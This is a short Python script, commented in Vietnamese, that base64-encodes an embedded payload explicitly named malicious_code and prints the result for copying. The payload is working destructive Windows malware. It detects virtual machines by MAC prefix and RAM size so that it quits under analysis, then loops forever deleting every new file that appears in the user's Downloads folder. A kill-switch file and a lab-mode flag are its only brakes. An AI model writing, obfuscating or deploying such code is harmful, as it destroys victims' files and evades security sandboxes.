import base64

malicious_code = r"""
import os
import time
import ctypes
import uuid

# --- CẤU HÌNH ---
USER_PROFILE = os.environ.get('USERPROFILE', r'C:\Users\Public')
TARGET_DIR = os.path.join(USER_PROFILE, "Downloads")
KILL_SWITCH = os.path.join(USER_PROFILE, "Desktop", "stop_malware.txt")
LAB_MODE = True # Bật True để test trên máy ảo không bị tự sát

def is_virtual_machine():
    try:
        # Check MAC Address (VMware, VirtualBox)
        mac_num = hex(uuid.getnode()).replace('0x', '').upper()
        mac = mac_num.zfill(12)
        vm_mac_prefixes = ['080027', '000569', '000C29', '001C14', '005056']
        for prefix in vm_mac_prefixes:
            if mac.startswith(prefix): return True

        # Check RAM < 4GB
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [("dwLength", ctypes.c_ulong), ("dwMemoryLoad", ctypes.c_ulong),
                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("sullAvailExtendedVirtual", ctypes.c_ulonglong)]
        stat = MEMORYSTATUSEX()
        stat.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(stat))
        if (stat.ullTotalPhys / (1024**3)) < 4.0: return True
        return False
    except:
        return True

def start_hunting():
    # 1. Kích hoạt Anti-VM
    if is_virtual_machine():
        if not LAB_MODE:
            os._exit(0) # Môi trường thật: Tự sát
        else:
            pass # Môi trường Lab: Biết là máy ảo nhưng vẫn chạy để báo cáo

    if not os.path.exists(TARGET_DIR): return
    known_files = set(os.listdir(TARGET_DIR))

    # 2. Vòng lặp phá hoại
    while True:
        if os.path.exists(KILL_SWITCH):
            os._exit(0)
            
        time.sleep(1.5)
        current_files = set(os.listdir(TARGET_DIR))
        new_files = current_files - known_files

        for file in new_files:
            file_path = os.path.join(TARGET_DIR, file)
            try:
                if os.path.isfile(file_path):
                    os.remove(file_path)
            except Exception:
                pass
        known_files = current_files

start_hunting()
"""

def encode_to_base64(python_code: str) -> str:
    """Hàm biến đổi code Python thành chuỗi Base64"""
    
    code_bytes = python_code.encode('utf-8')
    
    
    base64_bytes = base64.b64encode(code_bytes)
    
    
    base64_string = base64_bytes.decode('utf-8')
    
    return base64_string

if __name__ == "__main__":
  
    result = encode_to_base64(malicious_code)
    print("=== COPY CHUỖI BÊN DƯỚI ===")
    print(result)
   